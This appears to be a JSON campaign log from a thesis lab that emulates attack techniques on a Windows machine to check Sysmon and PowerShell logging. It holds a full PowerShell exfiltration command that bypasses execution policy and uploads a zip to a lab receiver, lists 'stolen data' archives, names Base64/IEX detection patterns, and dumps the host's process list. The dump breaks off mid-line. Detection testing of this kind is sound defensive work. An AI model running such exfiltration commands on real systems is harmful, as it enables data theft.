@@ -1,0 +1,542 @@
+﻿{
+    "Campaign":  {
+                     "Start":  "2026-07-12T14:26:13.0144935+02:00",
+                     "End":  "2026-07-12T14:33:03.7708692+02:00",
+                     "DurationSeconds":  410.76,
+                     "Hostname":  "LT29",
+                     "User":  "LT29\\seguridad",
+                     "ScriptExecuted":  "Write-CampaignSummary",
+                     "RunnerPath":  "C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\TFM_Run_All_TEC_Tests_v6_PATCHED_4104.ps1",
+                     "BasePath":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas",
+                     "LogFile":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\Logs_Pruebas_TFM\\TFM_TEC_Run_CANDIDATE_v5_20260712_142613.log",
+                     "SummaryTxt":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\Logs_Pruebas_TFM\\TFM_TEC_Run_CANDIDATE_v5_20260712_142613_summary.txt",
+                     "SummaryJson":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\Logs_Pruebas_TFM\\TFM_TEC_Run_CANDIDATE_v5_20260712_142613_summary.json",
+                     "SummaryCsv":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\Logs_Pruebas_TFM\\TFM_TEC_Run_CANDIDATE_v5_20260712_142613_summary.csv",
+                     "ReceiverUrl":  "http://192.168.1.129:8088/upload",
+                     "ReceiverPrecheck":  {
+                                              "Url":  "http://192.168.1.129:8088/upload",
+                                              "Host":  "192.168.1.129",
+                                              "Port":  8088,
+                                              "Reachable":  true,
+                                              "EnableExfilUpload":  true,
+                                              "Status":  "OK",
+                                              "Comment":  "Receiver reachable before TEC-009."
+                                          },
+                     "GlobalStatus":  "OK",
+                     "TechniquesOK":  9,
+                     "TechniquesWARN":  0,
+                     "TechniquesFAIL":  0
+                 },
+    "TEC009":  {
+                   "ExfilScriptAbsolutePath":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1",
+                   "ReceiverUrl":  "http://192.168.1.129:8088/upload",
+                   "ReceiverPrecheck":  {
+                                            "Url":  "http://192.168.1.129:8088/upload",
+                                            "Host":  "192.168.1.129",
+                                            "Port":  8088,
+                                            "Reachable":  true,
+                                            "EnableExfilUpload":  true,
+                                            "Status":  "OK",
+                                            "Comment":  "Receiver reachable before TEC-009."
+                                        },
+                   "Command":  "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\" -ReceiverUrl \"http://192.168.1.129:8088/upload\" -TimeoutSec 60 -EnableUpload -KeepArtifacts",
+                   "RunStartLocal":  "2026-07-12T14:30:56.9587750+02:00",
+                   "RunStartUTC":  "2026-07-12T12:30:56.9587750Z",
+                   "RunEndLocal":  "2026-07-12T14:31:21.6873732+02:00",
+                   "RunEndUTC":  "2026-07-12T12:31:21.6873732Z",
+                   "ExitCode":  0,
+                   "HttpStatus":  "200",
+                   "UploadSucceeded":  "True",
+                   "ZipFile":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive.zip",
+                   "CopyFile":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive_copy.zip",
+                   "LocalSHA256":  "e67bd7943a0d0435db8b7e345dcb20af00e5cc49ca5ce66a8f4899ef9cc36422",
+                   "SummaryFile":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_transfer_summary.json",
+                   "SummaryObject":  {
+                                         "Timestamp":  "2026-07-12T14:31:19.8210237+02:00",
+                                         "WorkDir":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB",
+                                         "OutputDir":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled",
+                                         "ZipFile":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive.zip",
+                                         "CopyFile":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive_copy.zip",
+                                         "ZipBytes":  6245,
+                                         "CopyBytes":  6245,
+                                         "LocalSHA256":  "e67bd7943a0d0435db8b7e345dcb20af00e5cc49ca5ce66a8f4899ef9cc36422",
+                                         "ReceiverUrl":  "http://192.168.1.129:8088/upload",
+                                         "EnableUpload":  true,
+                                         "TimeoutSec":  60,
+                                         "HttpStatusCode":  200,
+                                         "UploadSucceeded":  true,
+                                         "UploadError":  "",
+                                         "ReceiverResponse":  "{\"status\":\"ok\",\"bytes_received\":6245,\"saved_file\":\"received_public_final\\\\upload_20260712_123136_272943.zip\",\"sha256\":\"e67bd7943a0d0435db8b7e345dcb20af00e5cc49ca5ce66a8f4899ef9cc36422\"}",
+                                         "KeepArtifacts":  true
+                                     },
+                   "ZipLocal":  [
+                                    {
+                                        "FullName":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive.zip",
+                                        "Length":  6245,
+                                        "LastWriteTime":  "\/Date(1783859478531)\/"
+                                    },
+                                    {
+                                        "FullName":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive_copy.zip",
+                                        "Length":  6245,
+                                        "LastWriteTime":  "\/Date(1783859478531)\/"
+                                    },
+                                    {
+                                        "FullName":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\datos_robados\\dump_exfil_copy.zip",
+                                        "Length":  703157,
+                                        "LastWriteTime":  "\/Date(1781093060922)\/"
+                                    },
+                                    {
+                                        "FullName":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\datos_robados\\dump_exfil.zip",
+                                        "Length":  703157,
+                                        "LastWriteTime":  "\/Date(1781093060922)\/"
+                                    },
+                                    {
+                                        "FullName":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\dump_exfil.zip",
+                                        "Length":  352835,
+                                        "LastWriteTime":  "\/Date(1778840504030)\/"
+                                    },
+                                    {
+                                        "FullName":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\ENVIADO_dump_exfil.zip",
+                                        "Length":  352835,
+                                        "LastWriteTime":  "\/Date(1778840504030)\/"
+                                    }
+                                ],
+                   "PowerShell4104":  {
+                                          "Count":  1,
+                                          "RawCount":  3,
+                                          "MatchingCount":  1,
+                                          "Samples":  [
+                                                          {
+                                                              "TimeCreated":  "2026-07-12T14:31:00.6541609+02:00",
+                                                              "Id":  "4104",
+                                                              "ScriptBlockId":  "",
+                                                              "InvokeWebRequest":  true,
+                                                              "ApplicationZip":  true,
+                                                              "InFile":  true,
+                                                              "MethodPOST":  true,
+                                                              "ExfiltracionV3":  true
+                                                          }
+                                                      ],
+                                          "QueryStatus":  "OK",
+                                          "QueryError":  "",
+                                          "QueryErrorType":  "",
+                                          "QueryErrorFull":  "",
+                                          "QueryErrorPosition":  "",
+                                          "QueryScriptStackTrace":  "",
+                                          "QueryBlock":  "Write-TEC009PowerShell4104Summary/Get-WinEvent4104/NormalizeSamples",
+                                          "ActiveTechnique":  "TEC-009",
+                                          "Comment":  ""
+                                      },
+                   "EvidenceCheck":  [
+                                         {
+                                             "CheckName":  "powershell.exe -File invocation",
+                                             "Status":  "OK",
+                                             "Expected":  "powershell.exe -NoProfile -ExecutionPolicy Bypass -File",
+                                             "Found":  "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\" -ReceiverUrl \"http://192.168.1.129:8088/upload\" -TimeoutSec 60 -EnableUpload -KeepArtifacts",
+                                             "Evidence":  "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\" -ReceiverUrl \"http://192.168.1.129:8088/upload\" -TimeoutSec 60 -EnableUpload -KeepArtifacts",
+                                             "Comment":  "TEC-009 must run in an explicit PowerShell child process."
+                                         },
+                                         {
+                                             "CheckName":  "TEC-009 script exists",
+                                             "Status":  "OK",
+                                             "Expected":  "Existing TEC-009 PowerShell script path",
+                                             "Found":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1",
+                                             "Evidence":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1",
+                                             "Comment":  "The runner must invoke the real exfiltration script path."
+                                         },
+                                         {
+                                             "CheckName":  "summary JSON exists",
+                                             "Status":  "OK",
+                                             "Expected":  "Existing tec009_transfer_summary.json",
+                                             "Found":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_transfer_summary.json",
+                                             "Evidence":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_transfer_summary.json",
+                                             "Comment":  "Generated by exfiltracion_v3.ps1."
+                                         },
+                                         {
+                                             "CheckName":  "ZIP exists",
+                                             "Status":  "OK",
+                                             "Expected":  "Existing ZIP file",
+                                             "Found":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive.zip",
+                                             "Evidence":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive.zip",
+                                             "Comment":  "Controlled archive should remain available when KeepArtifacts is true."
+                                         },
+                                         {
+                                             "CheckName":  "ZIP copy exists",
+                                             "Status":  "OK",
+                                             "Expected":  "Existing ZIP copy",
+                                             "Found":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive_copy.zip",
+                                             "Evidence":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive_copy.zip",
+                                             "Comment":  "Local copy documents staging/copy behavior."
+                                         },
+                                         {
+                                             "CheckName":  "SHA256 present",
+                                             "Status":  "OK",
+                                             "Expected":  "64 hexadecimal SHA256",
+                                             "Found":  "e67bd7943a0d0435db8b7e345dcb20af00e5cc49ca5ce66a8f4899ef9cc36422",
+                                             "Evidence":  "e67bd7943a0d0435db8b7e345dcb20af00e5cc49ca5ce66a8f4899ef9cc36422",
+                                             "Comment":  "Hash documents file integrity, not encryption."
+                                         },
+                                         {
+                                             "CheckName":  "HTTP status 2xx",
+                                             "Status":  "OK",
+                                             "Expected":  "HTTP status between 200 and 299",
+                                             "Found":  "200",
+                                             "Evidence":  "200",
+                                             "Comment":  "Receiver must confirm controlled upload."
+                                         },
+                                         {
+                                             "CheckName":  "UploadSucceeded True",
+                                             "Status":  "OK",
+                                             "Expected":  "True",
+                                             "Found":  "True",
+                                             "Evidence":  "True",
+                                             "Comment":  "exfiltracion_v3.ps1 summary must confirm upload."
+                                         },
+                                         {
+                                             "CheckName":  "ReceiverUrl matches",
+                                             "Status":  "OK",
+                                             "Expected":  "http://192.168.1.129:8088/upload",
+                                             "Found":  "http://192.168.1.129:8088/upload",
+                                             "Evidence":  "http://192.168.1.129:8088/upload",
+                                             "Comment":  "Expected: http://192.168.1.129:8088/upload"
+                                         },
+                                         {
+                                             "CheckName":  "PowerShell 4104 upload evidence",
+                                             "Status":  "OK",
+                                             "Expected":  "Count greater than 0 and QueryStatus OK",
+                                             "Found":  "Count=1; QueryStatus=OK",
+                                             "Evidence":  "Count=1; QueryStatus=OK",
+                                             "Comment":  "A query error remains WARNING even when some events were counted."
+                                         }
+                                     ]
+               },
+    "TEC009EvidenceCheck":  [
+                                {
+                                    "CheckName":  "powershell.exe -File invocation",
+                                    "Status":  "OK",
+                                    "Expected":  "powershell.exe -NoProfile -ExecutionPolicy Bypass -File",
+                                    "Found":  "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\" -ReceiverUrl \"http://192.168.1.129:8088/upload\" -TimeoutSec 60 -EnableUpload -KeepArtifacts",
+                                    "Evidence":  "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\" -ReceiverUrl \"http://192.168.1.129:8088/upload\" -TimeoutSec 60 -EnableUpload -KeepArtifacts",
+                                    "Comment":  "TEC-009 must run in an explicit PowerShell child process."
+                                },
+                                {
+                                    "CheckName":  "TEC-009 script exists",
+                                    "Status":  "OK",
+                                    "Expected":  "Existing TEC-009 PowerShell script path",
+                                    "Found":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1",
+                                    "Evidence":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1",
+                                    "Comment":  "The runner must invoke the real exfiltration script path."
+                                },
+                                {
+                                    "CheckName":  "summary JSON exists",
+                                    "Status":  "OK",
+                                    "Expected":  "Existing tec009_transfer_summary.json",
+                                    "Found":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_transfer_summary.json",
+                                    "Evidence":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_transfer_summary.json",
+                                    "Comment":  "Generated by exfiltracion_v3.ps1."
+                                },
+                                {
+                                    "CheckName":  "ZIP exists",
+                                    "Status":  "OK",
+                                    "Expected":  "Existing ZIP file",
+                                    "Found":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive.zip",
+                                    "Evidence":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive.zip",
+                                    "Comment":  "Controlled archive should remain available when KeepArtifacts is true."
+                                },
+                                {
+                                    "CheckName":  "ZIP copy exists",
+                                    "Status":  "OK",
+                                    "Expected":  "Existing ZIP copy",
+                                    "Found":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive_copy.zip",
+                                    "Evidence":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive_copy.zip",
+                                    "Comment":  "Local copy documents staging/copy behavior."
+                                },
+                                {
+                                    "CheckName":  "SHA256 present",
+                                    "Status":  "OK",
+                                    "Expected":  "64 hexadecimal SHA256",
+                                    "Found":  "e67bd7943a0d0435db8b7e345dcb20af00e5cc49ca5ce66a8f4899ef9cc36422",
+                                    "Evidence":  "e67bd7943a0d0435db8b7e345dcb20af00e5cc49ca5ce66a8f4899ef9cc36422",
+                                    "Comment":  "Hash documents file integrity, not encryption."
+                                },
+                                {
+                                    "CheckName":  "HTTP status 2xx",
+                                    "Status":  "OK",
+                                    "Expected":  "HTTP status between 200 and 299",
+                                    "Found":  "200",
+                                    "Evidence":  "200",
+                                    "Comment":  "Receiver must confirm controlled upload."
+                                },
+                                {
+                                    "CheckName":  "UploadSucceeded True",
+                                    "Status":  "OK",
+                                    "Expected":  "True",
+                                    "Found":  "True",
+                                    "Evidence":  "True",
+                                    "Comment":  "exfiltracion_v3.ps1 summary must confirm upload."
+                                },
+                                {
+                                    "CheckName":  "ReceiverUrl matches",
+                                    "Status":  "OK",
+                                    "Expected":  "http://192.168.1.129:8088/upload",
+                                    "Found":  "http://192.168.1.129:8088/upload",
+                                    "Evidence":  "http://192.168.1.129:8088/upload",
+                                    "Comment":  "Expected: http://192.168.1.129:8088/upload"
+                                },
+                                {
+                                    "CheckName":  "PowerShell 4104 upload evidence",
+                                    "Status":  "OK",
+                                    "Expected":  "Count greater than 0 and QueryStatus OK",
+                                    "Found":  "Count=1; QueryStatus=OK",
+                                    "Evidence":  "Count=1; QueryStatus=OK",
+                                    "Comment":  "A query error remains WARNING even when some events were counted."
+                                }
+                            ],
+    "Techniques":  [
+                       {
+                           "TEC_ID":  "TEC-001",
+                           "NameTactic":  "PowerShell / T1059.001",
+                           "ScriptExecuted":  "powershell.exe",
+                           "ScriptPath":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                           "ExitCode":  0,
+                           "Start":  "\/Date(1783859247500)\/",
+                           "End":  "\/Date(1783859261002)\/",
+                           "DurationSeconds":  13.5,
+                           "ExpectedEvidence":  [
+                                                    "PowerShell process",
+                                                    "ExecutionPolicy Bypass",
+                                                    "FromBase64String",
+                                                    "IEX",
+                                                    "4104 if ScriptBlock logging is enabled"
+                                                ],
+                           "FoundEvidence":  [
+                                                 "Command A ExitCode=0",
+                                                 "Command B ExitCode=0",
+                                                 "Stdout=TEC001_BASE64_OK | TEC001_IEX_OK"
+                                             ],
+                           "SysmonRelevantEvents":  4,
+                           "PowerShell4104RelevantEvents":  3,
+                           "Status":  "OK",
+                           "Comment":  "PowerShell execution evidence generated for CU-001."
+                       },
+                       {
+                           "TEC_ID":  "TEC-002",
+                           "NameTactic":  "Windows Command Shell / T1059.003",
+                           "ScriptExecuted":  "cmd.exe",
+                           "ScriptPath":  "C:\\Windows\\System32\\cmd.exe",
+                           "ExitCode":  0,
+                           "Start":  "\/Date(1783859276156)\/",
+                           "End":  "\/Date(1783859279655)\/",
+                           "DurationSeconds":  3.5,
+                           "ExpectedEvidence":  [
+                                                    "cmd.exe /c",
+                                                    "command chaining",
+                                                    "PowerShell child process",
+                                                    "Sysmon ID 1"
+                                                ],
+                           "FoundEvidence":  [
+                                                 "ExitCode=0",
+                                                 "Stdout=TEC002_OK  | lt29\\seguridad |  | Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   | -------  ------    -----      -----     ------     --  -- -----------                                                   |     470      30    29168      16800       2,48   4164   0 AnyDesk                                                       |     387      23    29796      25476       1,17   5064   1 AnyDesk                                                       |     370      21     4356      19152       0,52   4172   0 armsvc                                                        |     214      14    14540      17404       0,08   1452   1 chrome                                                        |     341      23    18840      42056     148,28   5236   1 chrome                                                        |     367      21    17624      37400      10,17   6824   1 chrome                                                        |     187      10     6776       8588       0,14   9228   1 chrome                                                        |    1603      64    91888     149620      99,73   9348   1 chrome                                                        |     330      27    92688     146676     180,34   9452   1 chrome                                                        |     207      17    17020      22896       0,19   9756   1 chrome                                                        |     167      12     9768      16400       0,30  10568   1 chrome                                                        |      78       5     4468       4640       0,02    500   1 cmd                                                           |     242      13     3676      13012       0,56   1732   1 cmd                                                           |      78       5     4304       4372       0,03   3672   1 cmd                                                           |     191      12     7588      14140       0,67   5972   1 conhost                                                       |     104       7     6332       1276       0,67   9180   1 conhost                                                       |     193      13     7728      15212      14,45  10088   1 conhost                                                       |     266      14     4688      18704      12,86  12112   1 conhost                                                       |     818      25     2196       5700       3,70    552   0 csrss                                                         |     657      24     2124       5596      59,81    628   1 csrss                                                         |     450      16     4156      20024       7,94   4828   1 ctfmon                                                        |     309      15     3184       8752       0,45   6520   0 dasHost                                                       |     198      13     2968      10600       8,77   1928   1 dllhost                                                       |     194      17     3368      11312       0,27   4344   0 dllhost                                                       |     926      49    48200      93752     108,08    920   1 dwm                                                           |    3745     191    77856     172456     447,78   7848   1 explorer                                                      |      36       6     2036       4744       0,45    928   1 fontdrvhost                                                   |      36       5     1512       3308       0,28    936   0 fontdrvhost                                                   |       0       0       60          8                 0   0 Idle                                                          |     200      11     2064       9708       0,30   2308   0 igfxCUIService                                                |     129       7     1104       4996       0,03   4324   0 jhi_service                                                   |     229      12     3032      10136       0,53   4348   0 LMS                                                           |    1343      26     7844      19808      12,34    780   0 lsass                                                         |    1206      58    36380      82032       6,09   8012   1 M365Copilot                                                   |       0       0      564     235004      14,72   2184   0 Memory Compression                                            |     402      19    11952      24584       5,48   1088   0 MoUsoCoreWorker                                               |     494      17    10308      17280       1,31   7996   0 MpDefenderCoreService                                         |     180      11     9596         48       0,16   1184   1 msedgewebview2                                                |     342      19    17332        872       1,28   2428   1 msedgewebview2                                                |     322      25    58592         52       2,80  10488   1 msedgewebview2                                                |     336      18    11924       1360       0,84  10880   1 msedgewebview2                                                |    1115      40    37340       7596       3,48  10940   1 msedgewebview2                                                |     171      10     2692       8388       0,13  10952   1 msedgewebview2                                                |     935     251   343580     306396     933,91   4628   0 MsMpEng                                                       |     198      38     3952       9752       0,08   1260   0 NisSrv                                                        |     269      14     2980      16512       0,63   2748   1 notepad                                                       |     616      34     9980      33948       6,14   4416   0 nvcontainer                                                   |     420      33     5840      21056       2,70   6740   1 nvcontainer                                                   |     577      74    27704       4224       4,88   4156   1 NVIDIA Web Helper                                             |     342      22    13892      15208      64,94   4448   0 OGAgentService                                                |     368      20    18244      18172      41,56   4820   1 OGAgentUser                                                   |     801      34    40424      45328       5,08   4292   0 OneApp.IGCC.WinService                                        |     526      27    53172      59584       0,91  10196   1 powershell                                                    |     860      49   159100     168104      19,41  12104   1 powershell                                                    |     240      28    25788      18516       1,05   7864   0 PresentationFontCache                                         |       0      20     8344      35128      12,39    108   0 Registry                                                      |     164       9     1940       7092       0,17   4512   0 RtkAudUService64                                              |     168      10     1692       7704       0,17   8572   1 RtkAudUService64                                              |     132       9     1560       7228       0,38   6788   1 rundll32                                                      |     248      15     3504      21368       2,11   8608   1 RuntimeBroker                                                 |     311      14     3784      14144       9,19   9196   1 RuntimeBroker                                                 |     152      10     2272      10284       0,23  10428   1 RuntimeBroker                                                 |     305      16     5632      18444       1,00  10924   1 RuntimeBroker                                                 |     182      15     3960      12712       2,44   4524   0 rustdesk                                                      |     167      16     6548      13932      19,73   5500   1 rustdesk                                                      |     308      20     9760      15660       3,42   5812   1 rustdesk                                                      |    1111      79    80176      76360       4,89   9108   1 SearchApp                                                     |     277      13     3844      12844       0,81   5736   0 SecurityHealthService                                         |     797      13     6896      10296      74,97    772   0 services                                                      |     105       8     4756       7520       0,55   2424   0 SgrmBroker                                                    |     575      27    12484      51260       2,11   4536   1 ShellExperienceHost                                           |     601      22     6380      31528       3,34   2212   1 sihost                                                        |      53       3     1072       1020       1,22    432   0 smss                                                          |     431      21     5440      13528       0,80   3272   0 spoolsv                                                       |      83       7     1380       4868       0,02   4556   0 ssh-agent                                                     |     118       9     1900       6644       0,17   4616   0 sshd                                                          |     609      28    20116      52552       3,50   8320   1 StartMenuExperienceHost                                       |     337      12     2976      10480       5,98     68   0 svchost                                                       |    1439      22     9868      26960      10,64    904   0 svchost                                                       |    1181      19     8188      15596      37,98   1016   0 svchost                                                       |     484      19     4776      11628       5,34   1096   0 svchost                                                       |     220      12     2124       9724       0,50   1172   0 svchost                                                       |     115       7     1276       5032       0,08   1232   0 svchost                                                       |     471      15    18072      18664      11,84   1240   0 svchost                                                       |     227       9     1752       7884       0,11   1312   0 svchost                                                       |     402      18     6704      15792       5,56   1320   0 svchost                                                       |     245      14     3512      13464       1,16   1388   0 svchost                                                       |     151      23     5196       7200       1,47   1472   0 svchost                                                       |     260      10     2960       7576       1,95   1516   0 svchost                                                       |     231      10     2496       9632       1,19   1556   0 svchost                                                       |     588      13     3324       9852       2,95   1632   0 svchost                                                       |     163       7     1452       5896       0,47   1644   0 svchost                                                       |     394      16     4812       9452       2,28   1828   0 svchost                                                       |     333      19     6116      17776       8,52   1892   0 svchost                                                       |     179       9     1644       7544       0,09   1972   0 svchost                                                       |     172       9     1980       7696       0,30   2012   0 svchost                                                       |     224      12     2780      14080      32,52   2020   0 svchost                                                       |     207       7     1308       5844       0,19   2032   0 svchost                                                       |     264      12     3296      15416       2,20   2084   0 svchost                                                       |     226      14     2268       9008       0,25   2156   0 svchost                                                       |     124       8     1432       6928       0,09   2220   0 svchost                                                       |     191       9     1564       6668       0,17   2228   0 svchost                                                       |     181      10     2124       7556       1,25   2436   0 svchost                                                       |     168      11     2228       8420       2,70   2452   0 svchost                                                       |     187      11     2084       8104       0,58   2496   0 svchost                                                       |     496      20    13540      23244      26,02   2596   0 svchost                                                       |     213      13     2144       8412       0,17   2636   0 svchost                                                       |     430      33    10784      14884      17,27   2664   0 svchost                                                       |     407      18     5012      16612       0,95   2708   0 svchost                                                       |     341      18     4404      25944       4,44   2796   1 svchost                                                       |     174      11     8216      15272      22,67   2832   0 svchost                                                       |     327      13     3024      12524       1,13   2856   0 svchost                                                       |     366      14     2396       9052       0,86   3024   0 svchost                                                       |     340      16     4352       9808       6,91   3028   0 svchost                                                       |     133      11     1600       6304       0,80   3048   0 svchost                                                       |     114       7     1304       5948       0,03   3112   0 svchost                                                       |     202      11     1980       7896       0,28   3116   0 svchost                                                       |     245      18     2192      12272       0,33   3152   0 svchost                                                       |     166      12     1736       7168       0,55   3184   0 svchost                                                       |     111       8     1500       6004       0,17   3280   0 svchost                                                       |     178      10     2188       7432       2,95   3324   0 svchost                                                       |     208      12     2308       9184       0,30   3616   0 svchost                                                       |     222      13     3128      10296       0,34   3752   0 svchost                                                       |     272      18     3184       9440       0,95   3756   0 svchost                                                       |     364      16     2924      10112       0,33   3784   0 svchost                                                       |     264      13     2620       7352       0,17   3804   0 svchost                                                       |     526      26    21548      26064      12,31   4192   0 svchost                                                       |     447      28     5068      14976       1,70   4200   0 svchost                                                       |     420      28    19812      29544      17,72   4208   0 svchost                                                       |     207      12     2400       9380       1,03   4440   0 svchost                                                       |     136       9     1588       6280       0,06   4476   0 svchost                                                       |     128       8     1260       5416       0,03   4584   0 svchost                                                       |     109       7     1312       5284       0,31   4636   0 svchost                                                       |     431      20     6932      28340       2,06   4724   1 svchost                                                       |     333      19     4720      16276       0,50   5020   0 svchost                                                       |     358      18     4332      18980       0,69   5128   0 svchost                                                       |     380      24     3488      12384       0,56   5148   0 svchost                                                       |     166       9     1532       7308       0,03   5252   0 svchost                                                       |     475      20     4600      12960       0,27   5356   0 svchost                                                       |     236      13     4716       9908       0,70   5468   0 svchost                                                       |     209      12     1740       7148       0,16   5628   0 svchost                                                       |     133       7     1312       6076       0,09   6064   0 svchost                                                       |     305      15     3924      15108       9,14   6264   0 svchost                                                       |     525      19     9664      25832       4,23   6528   0 svchost                                                       |     289      24     2616       7536       0,73   6892   0 svchost                                                       |     175       9     1904       7664       0,16   7020   0 svchost                                                       |     309      15     6864      17160       2,13   7208   1 svchost                                                       |     200      12     2468      12048       2,81   7652   0 svchost                                                       |     227      11     2064      10104       0,81   9028   0 svchost                                                       |     252      14     2888      11712       0,28   9236   1 svchost                                                       |     275      16     4060      19012       0,31   9268   0 svchost                                                       |     213      12     2760       9604       0,16   9304   0 svchost                                                       |     216      13     2696      11316       0,42   9948   0 svchost                                                       |     146      10     2384      13596       0,30  10632   1 svchost                                                       |     259      16     7112      10580       1,00  10968   0 svchost                                                       |     424      19    13140      21616      31,25   4652   0 Sysmon64                                                      |    3816       0      192        148     397,05      4   0 System                                                        |     296      29     6036      16396       1,45   4568   1 taskhostw                                                     |     549      23     8932      37284       2,00  10984   1 TextInputHost                                                 |     181      58    22544      30304       1,44  11940   0 TiWorker                                                      |     136       9     1940       7832       0,11  12036   0 TrustedInstaller                                              |     250      14     2060       7608       1,30   4600   0 tvnserver                                                     |     119       8     1352       6888       0,06   5724   0 unsecapp                                                      |     137      10     1916       9304       0,11  10656   1 UserOOBEBroker                                                |     150      10     2840       6572       8,36   1884   0 VBoxService                                                   |     254      13     3204      10772       1,48   3248   1 VBoxTray                                                      |     366      18    44024      50568      27,92   2948   0 Velociraptor                                                  |     325      32    93324     109276      92,75   5276   1 velociraptor-v0.75.6-windows-amd64                            |     366      28     8072      26224       7,22   8176   1 veyon-server                                                  |     293      19     6644      18752       1,11   4644   0 veyon-service                                                 |     276      25     7420      23276       0,47   5472   1 veyon-worker                                                  |     169      11     2976      10112       0,31   4660   0 VGAuthService                               